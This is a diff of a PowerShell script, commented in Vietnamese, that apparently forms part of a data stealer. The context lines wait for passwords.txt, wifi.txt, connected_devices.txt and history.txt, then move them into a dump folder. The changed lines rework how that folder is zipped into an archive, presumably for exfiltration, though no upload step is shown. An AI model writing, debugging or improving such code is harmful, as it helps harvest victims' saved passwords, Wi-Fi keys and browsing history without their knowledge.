@@ -36,18 +36,18 @@ while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path 
 Move-Item passwords.txt, wifi.txt, connected_devices.txt, history.txt -Destination "$dumpFolder"
 
 # ============================================
-# NÉN DỮ LIỆU - CHỈ NÉN FILE CÓ DỮ LIỆU
+# NÉN DỮ LIỆU (ĐÃ SỬA LỖI)
 # ============================================
 
+# Đợi file được ghi hoàn tất
 Start-Sleep -Seconds 2
 
-# Lấy danh sách file CÓ DỮ LIỆU (loại file rỗng)
-$filesToZip = Get-ChildItem "$dumpFolder" -File | Where-Object { $_.Length -gt 0 }
-$fileCount = $filesToZip.Count
-Write-Output "Số file có dữ liệu trong thư mục dump: $fileCount"
+# Kiểm tra thư mục dump có file không
+$fileCount = (Get-ChildItem "$dumpFolder" -File -ErrorAction SilentlyContinue).Count
+Write-Output "Số file trong thư mục dump: $fileCount"
 
 if ($fileCount -eq 0) {
-    Write-Output "Không có file nào có dữ liệu để nén! Thoát."
+    Write-Output "Không có file nào để nén! Thoát."
     exit 1
 }
 
@@ -56,14 +56,13 @@ if (Test-Path "$dumpFile") {
     Remove-Item "$dumpFile" -Force
 }
 
-# Nén chỉ các file có dữ liệu
+# Nén bằng .NET (ổn định hơn Compress-Archive)
 try {
     Add-Type -AssemblyName System.IO.Compression.FileSystem
     $zip = [System.IO.Compression.ZipFile]::Open("$dumpFile", 'Create')
-    foreach ($file in $filesToZip) {
-        $relativePath = $file.Name
-        Write-Output "Đang thêm: $relativePath ($($file.Length) bytes)"
-        [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $file.FullName, $relativePath)
+    Get-ChildItem -Path "$dumpFolder" -Recurse | ForEach-Object {
+        $relativePath = $_.FullName.Substring($dumpFolder.Length + 1)
+        [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $_.FullName, $relativePath)
     }
     $zip.Dispose()
     Write-Output "Đã nén thành công: $dumpFile"
@@ -72,7 +71,7 @@ try {
     exit 1
 }
 
-# Kiểm tra file zip
+# Kiểm tra file zip có được tạo không
 if ((Test-Path "$dumpFile") -and ((Get-Item "$dumpFile").Length -gt 0)) {
     Write-Output "File zip đã được tạo, kích thước: $((Get-Item "$dumpFile").Length) bytes"
 } else {
